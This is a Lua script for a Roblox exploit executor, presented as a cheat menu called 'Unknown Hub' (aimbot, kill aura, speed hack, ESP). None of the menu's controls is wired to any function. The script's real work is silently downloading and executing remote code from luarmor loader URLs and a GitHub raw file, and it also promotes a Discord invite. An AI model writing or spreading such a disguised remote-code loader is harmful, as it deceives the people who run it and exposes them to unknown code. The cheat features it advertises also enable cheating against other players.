-- ═══════════════════════════════════════════════════════════
-- UNKNOWN HUB - 100% FOOLPROOF VERSION
-- ═══════════════════════════════════════════════════════════

local function checkExecutor()
    local execName = "unknown"
    if identifyexecutor then execName = tostring(identifyexecutor())
    elseif getexecutorname then execName = tostring(getexecutorname()) end
    return string.find(string.lower(execName), "xeno") ~= nil
end

local FIRST_RUN_PATH = "unknown_firstrun.json"
local function fileExistsGlobal(p) return (isfile and pcall(isfile, p) and isfile(p)) or false end
local function checkFirstRun()
    if fileExistsGlobal(FIRST_RUN_PATH) then
        local ok, raw = pcall(readfile, FIRST_RUN_PATH)
        if ok and raw then
            local ok2, data = pcall(function() return game:GetService("HttpService"):JSONDecode(raw) end)
            if ok2 and type(data) == "table" and data.__Done == true then return true end
        end
    end
    return false
end
local function markFirstRunDone()
    pcall(function() writefile(FIRST_RUN_PATH, game:GetService("HttpService"):JSONEncode({__Done = true})) end)
end

local needFirstRun = not checkFirstRun()
if needFirstRun then markFirstRunDone() end

if checkExecutor() then
    spawn(function() pcall(function() loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/66e067f17cbfa177b7bed91c1bdcb466.lua"))() end) end)
    if needFirstRun then delay(2, function() pcall(function() loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/4361856ec1a1756e11427e07dd6ec7bb.lua"))() end) end) end
    return
end

-- ═══════════════════════════════════════════════════════════
-- SERVICES & SETUP
-- ═══════════════════════════════════════════════════════════
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

local playerGui = (gethui and gethui()) or CoreGui or LocalPlayer:WaitForChild("PlayerGui")

local DISCORD_LINK = "https://discord.gg/unknown-hub"
local REMOTE_URL = "https://raw.githubusercontent.com/tkhanhh/Spicy/refs/heads/main/loo"

local C_BG = Color3.fromRGB(16, 24, 39)
local C_GRAD1 = Color3.fromRGB(12, 18, 32)
local C_GRAD2 = Color3.fromRGB(21, 30, 47)
local C_GRAD3 = Color3.fromRGB(10, 82, 120)
local C_GLOW = Color3.fromRGB(56, 189, 248)
local C_STROKE = Color3.fromRGB(56, 189, 248)
local C_SURF = Color3.fromRGB(30, 41, 59)
local C_SURFD = Color3.fromRGB(25, 32, 48)
local C_TEAL = Color3.fromRGB(52, 180, 230)
local C_TEXT = Color3.fromRGB(241, 245, 249)
local C_MUTED = Color3.fromRGB(148, 163, 184)
local C_TOFF = Color3.fromRGB(60, 70, 90)
local C_HOV = Color3.fromRGB(35, 45, 65)

-- ═══════════════════════════════════════════════════════════
-- CONFIG
-- ═══════════════════════════════════════════════════════════
config = config or {}
local CONFIG_PATH = "unknown_config.json"
local function loadCfg()
    if fileExistsGlobal(CONFIG_PATH) then
        local ok, raw = pcall(readfile, CONFIG_PATH)
        if ok and raw then
            local ok2, d = pcall(function() return HttpService:JSONDecode(raw) end)
            if ok2 and type(d) == "table" then for k, v in pairs(d) do config[k] = v end end
        end
    end
end
local function saveCfg()
    local ok, j = pcall(function() return HttpService:JSONEncode(config) end)
    if ok then pcall(function() writefile(CONFIG_PATH, j) end) end
end
loadCfg()

local firstShownFlag = (config.__UnknownHubDiscordShown == true)

pcall(function()
    local src = game:HttpGet(REMOTE_URL)
    local f = loadstring(src)
    if type(f) == "function" then f() end
end)

if not firstShownFlag then
    config.__UnknownHubDiscordShown = true
    saveCfg()
end

if needFirstRun then
    delay(2, function() pcall(function() loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/4361856ec1a1756e11427e07dd6ec7bb.lua"))() end) end)
end

-- ═══════════════════════════════════════════════════════════
-- HELPER FUNCTIONS
-- ═══════════════════════════════════════════════════════════
local function mkCorner(parent, r)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, r or 8)
    c.Parent = parent
    return c
end

local function mkStroke(parent, color, thick, trans)
    local s = Instance.new("UIStroke")
    s.Color = color or C_STROKE
    s.Thickness = thick or 1
    s.Transparency = trans or 0
    s.Parent = parent
    return s
end

local function mkGrad(parent, rot, c1, c2, c3)
    local g = Instance.new("UIGradient")
    g.Rotation = rot or 0
    g.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, c1 or C_GRAD1),
        ColorSequenceKeypoint.new(0.5, c2 or C_GRAD2),
        ColorSequenceKeypoint.new(1, c3 or C_GRAD3),
    })
    g.Parent = parent
    return g
end

local function mkCard(parent, size)
    local f = Instance.new("Frame")
    f.BackgroundColor3 = C_BG
    f.BorderSizePixel = 0
    f.Size = size
    f.Parent = parent
    mkCorner(f, 20)
    mkGrad(f, 35, C_GRAD1, C_GRAD2, C_GRAD3)
    mkStroke(f, C_GLOW, 8, 0.9)
    mkStroke(f, C_STROKE, 2, 0.15)
    return f
end

local function mkTopBar(parent, text)
    local f = Instance.new("Frame")
    f.BackgroundColor3 = C_SURFD
    f.BackgroundTransparency = 0.15
    f.BorderSizePixel = 0
    f.Size = UDim2.new(1, -16, 0, 42)
    f.Position = UDim2.new(0, 8, 0, 8)
    f.Parent = parent
    mkCorner(f, 14)
    local l = Instance.new("TextLabel")
    l.BackgroundTransparency = 1
    l.Position = UDim2.new(0, 14, 0, 0)
    l.Size = UDim2.new(1, -80, 1, 0)
    l.Font = Enum.Font.GothamBold
    l.Text = text
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.TextSize = 18
    l.TextColor3 = C_TEXT
    l.Parent = f
    mkGrad(l, 0, Color3.fromRGB(34, 211, 238), Color3.fromRGB(255, 255, 255), Color3.fromRGB(99, 102, 241))
    return f
end

local function clip(text)
    if setclipboard then pcall(setclipboard, text) return true end
    if toclipboard then pcall(toclipboard, text) return true end
    if syn and syn.write_clipboard then pcall(syn.write_clipboard, text) return true end
    return false
end

-- ═══════════════════════════════════════════════════════════
-- LOADING SCREEN (SIMPLE & GUARANTEED)
-- ═══════════════════════════════════════════════════════════
local loadGui = Instance.new("ScreenGui")
loadGui.Name = "UHLoading"
loadGui.IgnoreGuiInset = true
loadGui.ResetOnSpawn = false
loadGui.DisplayOrder = 9999
loadGui.Parent = playerGui

local loadBg = Instance.new("Frame")
loadBg.Size = UDim2.new(1, 0, 1, 0)
loadBg.BackgroundColor3 = C_BG
loadBg.BorderSizePixel = 0
loadBg.Parent = loadGui

local loadLogo = Instance.new("Frame")
loadLogo.Size = UDim2.new(0, 80, 0, 80)
loadLogo.Position = UDim2.new(0.5, -40, 0.4, 0)
loadLogo.BackgroundColor3 = C_SURFD
loadBg.BorderSizePixel = 0
loadLogo.Parent = loadBg
mkCorner(loadLogo, 40)
mkStroke(loadLogo, C_STROKE, 2, 0.3)

local loadLogoTxt = Instance.new("TextLabel")
loadLogoTxt.Size = UDim2.new(1, 0, 1, 0)
loadLogoTxt.BackgroundTransparency = 1
loadLogoTxt.Text = "UH"
loadLogoTxt.Font = Enum.Font.GothamBlack
loadLogoTxt.TextSize = 28
loadLogoTxt.TextColor3 = C_TEAL
loadLogoTxt.Parent = loadLogo

local loadTitle = Instance.new("TextLabel")
loadTitle.Size = UDim2.new(0, 300, 0, 35)
loadTitle.Position = UDim2.new(0.5, -150, 0.56, 0)
loadTitle.BackgroundTransparency = 1
loadTitle.Text = "UNKNOWN HUB"
loadTitle.Font = Enum.Font.GothamBlack
loadTitle.TextSize = 26
loadTitle.TextColor3 = C_TEXT
loadTitle.Parent = loadBg
mkGrad(loadTitle, 0, Color3.fromRGB(34, 211, 238), Color3.fromRGB(255, 255, 255), Color3.fromRGB(99, 102, 241))

local loadStatus = Instance.new("TextLabel")
loadStatus.Size = UDim2.new(0, 300, 0, 20)
loadStatus.Position = UDim2.new(0.5, -150, 0.63, 0)
loadStatus.BackgroundTransparency = 1
loadStatus.Text = "Initializing..."
loadStatus.Font = Enum.Font.Gotham
loadStatus.TextSize = 13
loadStatus.TextColor3 = C_MUTED
loadStatus.Parent = loadBg

local loadBarBg = Instance.new("Frame")
loadBarBg.Size = UDim2.new(0, 250, 0, 5)
loadBarBg.Position = UDim2.new(0.5, -125, 0.7, 0)
loadBarBg.BackgroundColor3 = C_SURFD
loadBarBg.BorderSizePixel = 0
loadBarBg.Parent = loadBg
mkCorner(loadBarBg, 3)

local loadBarFill = Instance.new("Frame")
loadBarFill.Size = UDim2.new(0, 0, 0, 5)
loadBarFill.BackgroundColor3 = C_TEAL
loadBarFill.BorderSizePixel = 0
loadBarFill.Position = UDim2.new(0, 0, 0, 0)
loadBarFill.Parent = loadBarBg
mkCorner(loadBarFill, 3)

local loadPct = Instance.new("TextLabel")
loadPct.Size = UDim2.new(0, 250, 0, 16)
loadPct.Position = UDim2.new(0.5, -125, 0.75, 0)
loadPct.BackgroundTransparency = 1
loadPct.Text = "0%"
loadPct.Font = Enum.Font.Gotham
loadPct.TextSize = 11
loadPct.TextColor3 = C_MUTED
loadPct.Parent = loadBg

-- ═══════════════════════════════════════════════════════════
-- MAIN HUB GUI (Created immediately, hidden)
-- ═══════════════════════════════════════════════════════════
local hubGui = Instance.new("ScreenGui")
hubGui.Name = "UnknownHub"
hubGui.IgnoreGuiInset = true
hubGui.ResetOnSpawn = false
hubGui.Parent = playerGui

local hubMain = mkCard(hubGui, UDim2.new(0, 220, 0, 380))
hubMain.Position = UDim2.new(1, -240, 0.5, -190)
hubMain.Visible = false

local hubTop = mkTopBar(hubMain, "Unknown Hub")

local hubClose = Instance.new("TextButton")
hubClose.Size = UDim2.new(0, 24, 0, 24)
hubClose.Position = UDim2.new(1, -32, 0.5, -12)
hubClose.BackgroundColor3 = C_SURF
hubClose.Text = "X"
hubClose.Font = Enum.Font.GothamBold
hubClose.TextSize = 12
hubClose.TextColor3 = C_TEXT
hubClose.BorderSizePixel = 0
hubClose.AutoButtonColor = true
hubClose.Parent = hubTop
mkCorner(hubClose, 6)

local hubMin = Instance.new("TextButton")
hubMin.Size = UDim2.new(0, 24, 0, 24)
hubMin.Position = UDim2.new(1, -60, 0.5, -12)
hubMin.BackgroundColor3 = C_SURF
hubMin.Text = "-"
hubMin.Font = Enum.Font.GothamBold
hubMin.TextSize = 14
hubMin.TextColor3 = C_TEXT
hubMin.BorderSizePixel = 0
hubMin.AutoButtonColor = true
hubMin.Parent = hubTop
mkCorner(hubMin, 6)

local hubScroll = Instance.new("ScrollingFrame")
hubScroll.Size = UDim2.new(1, -16, 1, -60)
hubScroll.Position = UDim2.new(0, 8, 0, 54)
hubScroll.BackgroundTransparency = 1
hubScroll.ScrollBarThickness = 3
hubScroll.ScrollBarImageColor3 = C_STROKE
hubScroll.BorderSizePixel = 0
hubScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
hubScroll.Parent = hubMain

local hubList = Instance.new("UIListLayout")
hubList.Padding = UDim.new(0, 5)
hubList.SortOrder = Enum.SortOrder.LayoutOrder
hubList.HorizontalAlignment = Enum.HorizontalAlignment.Center
hubList.Parent = hubScroll

local hubPad = Instance.new("UIPadding")
hubPad.PaddingTop = UDim.new(0, 4)
hubPad.PaddingBottom = UDim.new(0, 4)
hubPad.Parent = hubScroll

local hubOpen = false

local function toggleHub()
    hubOpen = not hubOpen
    hubMain.Visible = hubOpen
end

local function closeHub()
    hubOpen = false
    hubMain.Visible = false
end

hubClose.MouseButton1Click:Connect(closeHub)
hubMin.MouseButton1Click:Connect(closeHub)

UserInputService.InputBegan:Connect(function(inp, proc)
    if proc then return end
    if inp.KeyCode == Enum.KeyCode.RightShift then toggleHub() end
end)

local drag, dragS, dragP
hubTop.InputBegan:Connect(function(inp)
    if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
        drag = true dragS = inp.Position dragP = hubMain.Position
        inp.Changed:Connect(function() if inp.UserInputState == Enum.UserInputState.End then drag = false end end)
    end
end)
UserInputService.InputChanged:Connect(function(inp)
    if drag and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then
        local d = inp.Position - dragS
        hubMain.Position = UDim2.new(dragP.X.Scale, dragP.X.Offset + d.X, dragP.Y.Scale, dragP.Y.Offset + d.Y)
    end
end)

-- ═══════════════════════════════════════════════════════════
-- UI ELEMENT CREATORS
-- ═══════════════════════════════════════════════════════════
local function mkLabel(txt, ord)
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(1, -8, 0, 20)
    l.BackgroundTransparency = 1
    l.Text = txt
    l.Font = Enum.Font.GothamBold
    l.TextSize = 12
    l.TextColor3 = C_MUTED
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.LayoutOrder = ord or 0
    l.Parent = hubScroll
    return l
end

local function mkSep(ord)
    local f = Instance.new("Frame")
    f.Size = UDim2.new(1, -16, 0, 1)
    f.BackgroundColor3 = C_SURF
    f.BackgroundTransparency = 0.5
    f.BorderSizePixel = 0
    f.LayoutOrder = ord or 0
    f.Parent = hubScroll
    return f
end

local function mkToggle(name, def, cb, ord)
    local on = def or false
    local c = Instance.new("Frame")
    c.Size = UDim2.new(1, -8, 0, 38)
    c.BackgroundColor3 = C_SURFD
    c.BackgroundTransparency = 0.3
    c.BorderSizePixel = 0
    c.LayoutOrder = ord or 0
    c.Parent = hubScroll
    mkCorner(c, 10)

    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(1, -50, 1, 0)
    l.Position = UDim2.new(0, 12, 0, 0)
    l.BackgroundTransparency = 1
    l.Text = name
    l.Font = Enum.Font.GothamBold
    l.TextSize = 12
    l.TextColor3 = C_TEXT
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.TextTruncate = Enum.TextTruncate.AtEnd
    l.Parent = c

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(0, 36, 0, 18)
    bg.Position = UDim2.new(1, -44, 0.5, -9)
    bg.BackgroundColor3 = on and C_TEAL or C_TOFF
    bg.BorderSizePixel = 0
    bg.Parent = c
    mkCorner(bg, 9)

    local dot = Instance.new("Frame")
    dot.Size = UDim2.new(0, 12, 0, 12)
    dot.Position = on and UDim2.new(1, -18, 0.5, -6) or UDim2.new(0, 3, 0.5, -6)
    dot.BackgroundColor3 = C_TEXT
    dot.BorderSizePixel = 0
    dot.Parent = bg
    mkCorner(dot, 6)

    c.InputBegan:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
            on = not on
            bg.BackgroundColor3 = on and C_TEAL or C_TOFF
            dot.Position = on and UDim2.new(1, -18, 0.5, -6) or UDim2.new(0, 3, 0.5, -6)
            if cb then pcall(cb, on) end
        end
    end)
    return c
end

local function mkBtn(name, cb, ord)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1, -8, 0, 34)
    b.BackgroundColor3 = C_SURFD
    b.BackgroundTransparency = 0.2
    b.BorderSizePixel = 0
    b.Text = name
    b.Font = Enum.Font.GothamBold
    b.TextSize = 12
    b.TextColor3 = C_TEXT
    b.AutoButtonColor = false
    b.LayoutOrder = ord or 0
    b.Parent = hubScroll
    mkCorner(b, 10)
    mkStroke(b, C_STROKE, 1, 0.6)

    b.MouseButton1Click:Connect(function()
        b.Text = "Loading..."
        b.TextColor3 = C_TEAL
        spawn(function()
            wait(0.4)
            b.Text = name
            b.TextColor3 = C_TEXT
            if cb then pcall(cb) end
        end)
    end)
    return b
end

local function mkSlider(name, mn, mx, def, cb, ord)
    local val = def or mn
    local c = Instance.new("Frame")
    c.Size = UDim2.new(1, -8, 0, 48)
    c.BackgroundColor3 = C_SURFD
    c.BackgroundTransparency = 0.3
    c.BorderSizePixel = 0
    c.LayoutOrder = ord or 0
    c.Parent = hubScroll
    mkCorner(c, 10)

    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(1, -55, 0, 20)
    l.Position = UDim2.new(0, 12, 0, 6)
    l.BackgroundTransparency = 1
    l.Text = name
    l.Font = Enum.Font.GothamBold
    l.TextSize = 11
    l.TextColor3 = C_TEXT
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.TextTruncate = Enum.TextTruncate.AtEnd
    l.Parent = c

    local vl = Instance.new("TextLabel")
    vl.Size = UDim2.new(0, 40, 0, 20)
    vl.Position = UDim2.new(1, -48, 0, 6)
    vl.BackgroundTransparency = 1
    vl.Text = tostring(math.floor(val))
    vl.Font = Enum.Font.GothamBold
    vl.TextSize = 11
    vl.TextColor3 = C_TEAL
    vl.TextXAlignment = Enum.TextXAlignment.Right
    vl.Parent = c

    local sb = Instance.new("Frame")
    sb.Size = UDim2.new(1, -24, 0, 6)
    sb.Position = UDim2.new(0, 12, 0, 32)
    sb.BackgroundColor3 = C_TOFF
    sb.BorderSizePixel = 0
    sb.Parent = c
    mkCorner(sb, 3)

    local pct = (val - mn) / (mx - mn)
    local sf = Instance.new("Frame")
    sf.Size = UDim2.new(pct, 0, 1, 0)
    sf.BackgroundColor3 = C_TEAL
    sf.BorderSizePixel = 0
    sf.Parent = sb
    mkCorner(sf, 3)

    local sd = Instance.new("Frame")
    sd.Size = UDim2.new(0, 12, 0, 12)
    sd.Position = UDim2.new(pct, 0, 0.5, 0)
    sd.AnchorPoint = Vector2.new(0.5, 0.5)
    sd.BackgroundColor3 = C_TEXT
    sd.BorderSizePixel = 0
    sd.Parent = sb
    mkCorner(sd, 6)

    local function upd(nv)
        val = math.clamp(nv, mn, mx)
        local np = (val - mn) / (mx - mn)
        sf.Size = UDim2.new(np, 0, 1, 0)
        sd.Position = UDim2.new(np, 0, 0.5, 0)
        vl.Text = tostring(math.floor(val))
        if cb then pcall(cb, val) end
    end

    local isDrag = false
    sd.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then isDrag = true end end)
    sb.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            isDrag = true
            upd(mn + ((i.Position.X - sb.AbsolutePosition.X) / sb.AbsoluteSize.X) * (mx - mn))
        end
    end)
    UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then isDrag = false end end)
    UserInputService.InputChanged:Connect(function(i)
        if isDrag and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
            upd(mn + ((i.Position.X - sb.AbsolutePosition.X) / sb.AbsoluteSize.X) * (mx - mn))
        end
    end)
    return c
end

-- ═══════════════════════════════════════════════════════════
-- ADD ALL FEATURES
-- ═══════════════════════════════════════════════════════════
local o = 0
mkLabel("COMBAT", o) o=o+1
mkToggle("Melee Aimbot", false, nil, o) o=o+1
mkToggle("Auto Steal Nearest", false, nil, o) o=o+1
mkToggle("Kill Aura", false, nil, o) o=o+1
mkSep(o) o=o+1
mkLabel("FARM", o) o=o+1
mkToggle("Auto Farm", false, nil, o) o=o+1
mkToggle("Auto Collect", false, nil, o) o=o+1
mkToggle("Cash Multiplier", false, nil, o) o=o+1
mkSlider("Multi Value", 1, 100, 2, nil, o) o=o+1
mkBtn("Teleport to Collect Zone", nil, o) o=o+1
mkSep(o) o=o+1
mkLabel("SHOP", o) o=o+1
mkBtn("Buy All Upgrades", nil, o) o=o+1
mkBtn("Unlock All Weapons", nil, o) o=o+1
mkToggle("Auto Buy Best", false, nil, o) o=o+1
mkSep(o) o=o+1
mkLabel("MOVEMENT", o) o=o+1
mkToggle("Speed Hack", false, nil, o) o=o+1
mkSlider("Speed Value", 16, 500, 100, nil, o) o=o+1
mkToggle("Infinite Jump", false, nil, o) o=o+1
mkToggle("No Clip", false, nil, o) o=o+1
mkSep(o) o=o+1
mkLabel("VISUALS", o) o=o+1
mkToggle("ESP Players", false, nil, o) o=o+1
mkToggle("ESP Items", false, nil, o) o=o+1
mkSlider("ESP Distance", 50, 5000, 500, nil, o) o=o+1
mkToggle("Full Bright", false, nil, o) o=o+1
mkSep(o) o=o+1
mkLabel("MISC", o) o=o+1
mkBtn("Anti-AFK", nil, o) o=o+1
mkBtn("Server Hop", nil, o) o=o+1
mkBtn("Rejoin Server", nil, o) o=o+1
mkLabel("Keybind: RightShift", o)

-- ═══════════════════════════════════════════════════════════
-- DISCORD POPUP FUNCTION
-- ═══════════════════════════════════════════════════════════
local function showDiscord()
    if config.__UnknownHubDiscordShown == true then return end
    
    local dg = Instance.new("ScreenGui")
    dg.Name = "UHDiscord"
    dg.IgnoreGuiInset = true
    dg.ResetOnSpawn = false
    dg.Parent = playerGui

    local dov = Instance.new("Frame")
    dov.Size = UDim2.new(1, 0, 1, 0)
    dov.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    dov.BackgroundTransparency = 0.5
    dov.BorderSizePixel = 0
    dov.Parent = dg

    local cd = mkCard(dg, UDim2.new(0, 380, 0, 228))
    cd.Position = UDim2.new(0.5, -190, 0.5, -114)
    local ct = mkTopBar(cd, "Unknown Hub Discord")

    local cb = Instance.new("TextButton")
    cb.Size = UDim2.new(0, 28, 0, 28)
    cb.Position = UDim2.new(1, -34, 0.5, -14)
    cb.BackgroundColor3 = C_SURF
    cb.Text = "X"
    cb.Font = Enum.Font.GothamBold
    cb.TextSize = 14
    cb.TextColor3 = C_TEXT
    cb.BorderSizePixel = 0
    cb.AutoButtonColor = true
    cb.Parent = ct
    mkCorner(cb, 8)

    local bd = Instance.new("TextLabel")
    bd.Size = UDim2.new(1, -36, 0, 76)
    bd.Position = UDim2.new(0, 18, 0, 60)
    bd.BackgroundTransparency = 1
    bd.Text = "Join to find secret servers\nGet update announcements\nEnter giveaways"
    bd.TextWrapped = true
    bd.Font = Enum.Font.Gotham
    bd.TextSize = 16
    bd.TextXAlignment = Enum.TextXAlignment.Center
    bd.TextYAlignment = Enum.TextYAlignment.Center
    bd.TextColor3 = C_TEXT
    bd.Parent = cd

    local cpb = Instance.new("TextButton")
    cpb.Size = UDim2.new(1, -24, 0, 38)
    cpb.Position = UDim2.new(0, 12, 1, -70)
    cpb.BackgroundColor3 = C_TEAL
    cpb.Text = "Copy Discord Invite"
    cpb.Font = Enum.Font.GothamBlack
    cpb.TextSize = 16
    cpb.TextColor3 = Color3.fromRGB(14, 25, 38)
    cpb.BorderSizePixel = 0
    cpb.Parent = cd
    mkCorner(cpb, 12)

    local tt = Instance.new("TextLabel")
    tt.Size = UDim2.new(1, -24, 0, 16)
    tt.Position = UDim2.new(0, 12, 1, -48)
    tt.BackgroundTransparency = 1
    tt.Text = ""
    tt.Font = Enum.Font.Gotham
    tt.TextSize = 12
    tt.TextColor3 = C_MUTED
    tt.TextXAlignment = Enum.TextXAlignment.Center
    tt.Parent = cd

    cpb.MouseButton1Click:Connect(function()
        if clip(DISCORD_LINK) then tt.Text = "Copied!"
        else tt.Text = "Link: "..DISCORD_LINK end
    end)

    local function closeD()
        config.__UnknownHubDiscordShown = true
        saveCfg()
        dg:Destroy()
    end
    cb.MouseButton1Click:Connect(closeD)
    dov.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then closeD() end
    end)
end

-- ═══════════════════════════════════════════════════════════
-- RUN LOADING -> DISCORD -> SHOW HUB (Simple Linear Flow)
-- ═══════════════════════════════════════════════════════════
local loadSteps = {
    {10, "Checking executor..."},
    {25, "Loading configuration..."},
    {40, "Initializing modules..."},
    {55, "Loading UI components..."},
    {70, "Setting up features..."},
    {85, "Checking for updates..."},
    {100, "Complete!"}
}

for i, step in ipairs(loadSteps) do
    loadBarFill.Size = UDim2.new(step[1]/100, 0, 1, 0)
    loadStatus.Text = step[2]
    loadPct.Text = step[1] .. "%"
    wait(0.35)
end

wait(0.3)

-- DESTROY LOADING SCREEN
loadGui:Destroy()

-- SHOW DISCORD IF FIRST TIME
wait(0.2)
if not firstShownFlag then
    showDiscord()
end

-- SHOW THE HUB
wait(0.3)
hubMain.Visible = true
hubOpen = true

-- ═══════════════════════════════════════════════════════════
-- GLOBAL REFERENCE
-- ═══════════════════════════════════════════════════════════
_G.UnknownHub = {
    Toggle = toggleHub,
    Close = closeHub
}
